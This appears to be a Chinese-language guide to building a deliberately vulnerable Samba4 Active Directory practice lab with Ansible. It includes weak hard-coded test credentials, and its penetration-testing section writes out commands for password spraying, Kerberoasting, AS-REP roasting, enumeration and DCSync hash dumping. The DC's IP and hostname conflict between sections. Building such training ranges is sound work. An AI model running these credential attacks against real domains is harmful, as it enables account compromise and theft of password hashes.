# Samba4 Active Directory Ansible 自动化部署指南

## 概述

本文档介绍如何使用 Ansible 自动化部署 Samba4 Active Directory 靶场环境，包括一个域控制器（DC）和多个域成员服务器。

## 环境架构

```
                    ┌─────────────────┐
                    │   victim1 (DC)  │
                    │   10.0.1.4      │
                    │ Samba AD DC     │
                    └────────┬────────┘
                             │
         ┌───────────────────┼───────────────────┐
         │                   │                   │
┌────────┴────────┐ ┌────────┴────────┐ ┌────────┴────────┐
│    victim2      │ │   redirector    │ │  emailServer    │
│   10.0.1.5      │ │   10.0.1.2      │ │   10.0.1.3      │
│  Domain Member  │ │  Domain Member  │ │  Domain Member  │
└─────────────────┘ └─────────────────┘ └─────────────────┘
```

### 域配置信息

| 参数 | 值 |
|------|-----|
| 域名 (Realm) | `YOURCOMPANY.LOCAL` |
| NetBIOS 名 | `YOURCOMPANY` |
| 域管理员密码 | `P@ssw0rd123!` |
| DC IP 地址 | `10.0.1.4` |

---

## 项目结构

```
samba-ad/
├── ansible.cfg              # Ansible 配置文件
├── inventory.ini            # 主机清单
├── site.yml                 # 主 Playbook
├── run-setup.sh             # 一键部署脚本
├── verify-setup.sh          # 环境验证脚本
├── MANUAL_SETUP.md          # 手工配置参考
├── ANSIBLE_DEPLOYMENT.md    # 本文档
└── roles/
    ├── samba_dc/            # 域控制器角色
    │   └── tasks/
    │       └── main.yml
    └── samba_member/        # 域成员角色
        ├── tasks/
        │   └── main.yml
        └── templates/
            ├── krb5.conf.j2
            └── smb.conf.member.j2
```

---

## 前置条件

### 1. 控制机（运行 Ansible 的机器）

```bash
# 安装 Ansible
pip install ansible

# 验证安装
ansible --version
```

### 2. 目标主机

- Ubuntu 20.04/22.04 LTS（推荐）
- 已配置 SSH 密钥认证
- 用户具有 sudo 权限
- 网络互通（内网 10.0.1.x 段）

---

## 配置文件说明

### inventory.ini - 主机清单

```ini
# 域控制器
[dc]
victimDC ansible_host=victimDC

# Domain Members
[domain_members]
victim1 ansible_host=victim1
victim2 ansible_host=victim2
victim3 ansible_host=victim3
victim4 ansible_host=victim4
victim5 ansible_host=victim5

# 全局变量
[samba_ad:vars]
ansible_user=lexuswang                    # SSH 用户名
ansible_python_interpreter=/usr/bin/python3
domain_name=YOURCOMPANY.LOCAL             # 域名
domain_netbios=YOURCOMPANY                # NetBIOS 名
domain_admin_password=P@ssw0rd123!        # 域管理员密码
dc_ip=10.0.2.1                            # DC IP 地址
```

**自定义配置**：

如需修改域名或其他参数，编辑 `inventory.ini` 中的 `[samba_ad:vars]` 部分。

### ansible.cfg - Ansible 配置

```ini
[defaults]
inventory = inventory.ini
roles_path = roles
host_key_checking = False      # 首次连接不验证主机密钥
timeout = 30

[privilege_escalation]
become = True
become_method = sudo
become_ask_pass = True         # 运行时询问 sudo 密码

[ssh_connection]
pipelining = True              # 提高执行效率
```

---

## 测试连接

```bash
cd samba-ad/
ansible all -m ping --ask-become-pass
```

预期输出：
```
victimDC | SUCCESS => {"ping": "pong"}
victim2 | SUCCESS => {"ping": "pong"}
...
```

---

## 部署步骤

### 方式一：使用一键部署脚本（推荐）

```bash
cd samba-ad/

# 部署完整环境（DC + 所有域成员）
./run-setup.sh all

# 或分步部署
./run-setup.sh dc        # 仅部署域控制器
./run-setup.sh members   # 仅部署域成员

# 检查主机连接性
./run-setup.sh check
```

### 方式二：直接使用 Ansible Playbook

```bash
cd samba-ad/

# 部署完整环境
ansible-playbook site.yml --ask-become-pass

# 仅部署域控制器
ansible-playbook site.yml --tags dc --ask-become-pass

# 仅部署域成员
ansible-playbook site.yml --tags members --ask-become-pass

# 详细输出模式
ansible-playbook site.yml --ask-become-pass -v

# 检查模式（不实际执行）
ansible-playbook site.yml --ask-become-pass --check
```

### 方式三：指定目标主机

```bash
# 仅部署 victim2
ansible-playbook site.yml --limit victim2 --ask-become-pass

# 部署多个指定主机
ansible-playbook site.yml --limit "victim2,redirector" --ask-become-pass
```

---

## 部署流程详解

### 阶段 1：域控制器配置 (samba_dc 角色)

1. **安装软件包**
   - samba, smbclient, krb5-user, winbind, ldb-tools, python3-samba 等

2. **停用冲突服务**
   - 停止并 mask smbd, nmbd, winbind
   - 禁用 systemd-resolved（释放 53 端口）

3. **配置 Samba AD 域**
   ```bash
   samba-tool domain provision \
       --server-role=dc \
       --use-rfc2307 \
       --dns-backend=SAMBA_INTERNAL \
       --realm=YOURCOMPANY.LOCAL \
       --domain=YOURCOMPANY \
       --adminpass='P@ssw0rd123!'
   ```

4. **配置 Kerberos 和 DNS**
   - 复制 `/var/lib/samba/private/krb5.conf` 到 `/etc/krb5.conf`
   - 配置 `/etc/resolv.conf` 指向本机

5. **启动 samba-ad-dc 服务**

6. **创建测试用户**
   - jsmith, mwilson (普通用户)
   - admin.backup (Domain Admins 成员)
   - svc_sql (带 SPN 的服务账户)

### 阶段 2：域成员配置 (samba_member 角色)

1. **安装软件包**
   - samba, smbclient, krb5-user, winbind 等

2. **配置 DNS**
   - 禁用 systemd-resolved
   - 配置 `/etc/resolv.conf` 指向 DC (10.0.1.4)

3. **配置 Kerberos** (使用 krb5.conf.j2 模板)

4. **配置 Samba** (使用 smb.conf.member.j2 模板)

5. **加入域**
   ```bash
   net ads join -U Administrator%'P@ssw0rd123!'
   ```

6. **配置 NSS 和 PAM**
   - 启用 winbind 用户/组解析
   - 配置自动创建家目录

7. **启动服务**
   - smbd, nmbd, winbind

---

## 验证部署

### 使用验证脚本

```bash
./verify-setup.sh
```

### 手动验证命令

#### 在域控制器 (victim1) 上：

```bash
# 检查域级别
sudo samba-tool domain level show

# 列出域计算机
sudo samba-tool computer list

# 列出域用户
sudo samba-tool user list

# 测试 DNS
host -t A victim1.yourcompany.local localhost

# 测试 Kerberos
kinit Administrator
# 输入密码: P@ssw0rd123!
klist
```

#### 在域成员上：

```bash
# 测试域加入状态
net ads testjoin

# 测试 winbind 连接
wbinfo -t

# 列出域用户
wbinfo -u

# 列出域组
wbinfo -g

# 测试用户解析
getent passwd jsmith

# 测试域用户登录
su - jsmith
# 密码: Summer2024!

# 测试 Kerberos 认证
kinit jsmith@YOURCOMPANY.LOCAL
klist

# 测试 SMB 访问
smbclient -L //victim1 -k
```

---

## 测试用户列表

| 用户名 | 密码 | 角色 | 用途 |
|--------|------|------|------|
| Administrator | P@ssw0rd123! | Domain Admin | 域管理员 |
| admin.backup | Backup@dmin1 | Domain Admin | 备份管理员 |
| jsmith | Summer2024! | Domain User | 普通用户 |
| mwilson | Welcome123! | Domain User | 普通用户 |
| svc_sql | SqlService1! | Domain User | SQL 服务账户（有 SPN，可 Kerberoast） |

---

## 渗透测试场景

本环境支持以下攻击演练：

### 1. 密码喷洒 (Password Spraying)

```bash
# 使用 crackmapexec
crackmapexec smb 10.0.1.4 -u users.txt -p 'Summer2024!' --continue-on-success
```

### 2. Kerberoasting

```bash
# svc_sql 账户有 SPN，可以获取 TGS 并离线破解
GetUserSPNs.py YOURCOMPANY.LOCAL/jsmith:'Summer2024!' -dc-ip 10.0.1.4 -request
```

### 3. AS-REP Roasting

```bash
# 查找不需要预认证的用户
GetNPUsers.py YOURCOMPANY.LOCAL/ -usersfile users.txt -dc-ip 10.0.1.4
```

### 4. LDAP 枚举

```bash
# 匿名 LDAP 查询
ldapsearch -x -H ldap://10.0.1.4 -b "DC=yourcompany,DC=local" "(objectClass=user)" cn

# 认证 LDAP 查询
ldapsearch -x -H ldap://10.0.1.4 -D "jsmith@yourcompany.local" -w 'Summer2024!' \
    -b "DC=yourcompany,DC=local" "(objectClass=user)" cn sAMAccountName
```

### 5. SMB 枚举

```bash
# 列出共享
smbclient -L //10.0.1.4 -U jsmith%'Summer2024!'

# 枚举用户
enum4linux -U 10.0.1.4
```

### 6. DCSync (需要 Domain Admin)

```bash
# 使用 Domain Admin 凭据提取所有密码哈希
secretsdump.py YOURCOMPANY/Administrator:'P@ssw0rd123!'@10.0.1.4
```

---

## 故障排除

### 问题 1：Ansible 连接失败

```bash
# 检查 SSH 连接
ssh victim1 "hostname"

# 检查 Python 解释器
ansible all -m raw -a "which python3"

# 使用详细模式
ansible all -m ping -vvv
```

### 问题 2：域配置失败

```bash
# 检查 Samba AD 服务状态
sudo systemctl status samba-ad-dc

# 查看 Samba 日志
sudo tail -f /var/log/samba/log.samba

# 重新配置（慎用，会删除现有配置）
sudo systemctl stop samba-ad-dc
sudo rm -rf /var/lib/samba/*
sudo rm /etc/samba/smb.conf
# 然后重新运行 playbook
```

### 问题 3：域成员无法加入

```bash
# 检查 DNS 解析
nslookup victim1.yourcompany.local 10.0.1.4

# 检查时间同步（Kerberos 要求时间差 < 5分钟）
date
ntpdate -q victim1

# 检查网络连通性
ping 10.0.1.4
telnet 10.0.1.4 389  # LDAP
telnet 10.0.1.4 88   # Kerberos
```

### 问题 4：Winbind 无法工作

```bash
# 检查服务状态
sudo systemctl status winbind

# 重启相关服务
sudo systemctl restart smbd nmbd winbind

# 查看 winbind 日志
sudo tail -f /var/log/samba/log.winbindd

# 重新加入域
sudo net ads leave -U Administrator%'P@ssw0rd123!'
sudo net ads join -U Administrator%'P@ssw0rd123!'
sudo systemctl restart smbd nmbd winbind
```

### 问题 5：DNS 端口被占用

```bash
# 检查 53 端口占用
sudo ss -tlnp | grep :53

# 如果是 systemd-resolved 占用
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved
```

---

## 重置环境

### 重置域成员

```bash
# 在域成员上执行
sudo net ads leave -U Administrator%'P@ssw0rd123!'
sudo systemctl stop smbd nmbd winbind
sudo rm -rf /var/lib/samba/*
sudo rm /etc/samba/smb.conf
```

### 重置域控制器

```bash
# 在 DC 上执行
sudo systemctl stop samba-ad-dc
sudo rm -rf /var/lib/samba/*
sudo rm /etc/samba/smb.conf
```

### 重新部署

```bash
./run-setup.sh all
```

---

## 扩展配置

### 添加新的域成员

1. 在 `inventory.ini` 中添加新主机：
   ```ini
   [domain_members]
   victim2 ansible_host=victim2
   new_host ansible_host=new_host_ip
   ```

2. 运行 playbook：
   ```bash
   ansible-playbook site.yml --limit new_host --tags members --ask-become-pass
   ```

### 添加新用户

```bash
# 在 DC 上执行
sudo samba-tool user create username 'Password123!' \
    --given-name="First" --surname="Last" \
    --mail-address="username@yourcompany.local"
```

### 添加到 Domain Admins

```bash
sudo samba-tool group addmembers "Domain Admins" username
```

### 设置 SPN（用于 Kerberoasting 演示）

```bash
sudo samba-tool spn add HTTP/webserver.yourcompany.local:80 username
```

---

## 参考文档

- [Samba AD DC HOWTO](https://wiki.samba.org/index.php/Setting_up_Samba_as_an_Active_Directory_Domain_Controller)
- [Samba Domain Member](https://wiki.samba.org/index.php/Setting_up_Samba_as_a_Domain_Member)
- [Ansible Documentation](https://docs.ansible.com/)

---

## 附录：完整变量参考

| 变量名 | 默认值 | 说明 |
|--------|--------|------|
| `domain_name` | YOURCOMPANY.LOCAL | Kerberos Realm |
| `domain_netbios` | YOURCOMPANY | NetBIOS 域名 |
| `domain_admin_password` | P@ssw0rd123! | 域管理员密码 |
| `dc_ip` | 10.0.1.4 | 域控制器 IP |
| `ansible_user` | lexuswang | SSH 连接用户 |
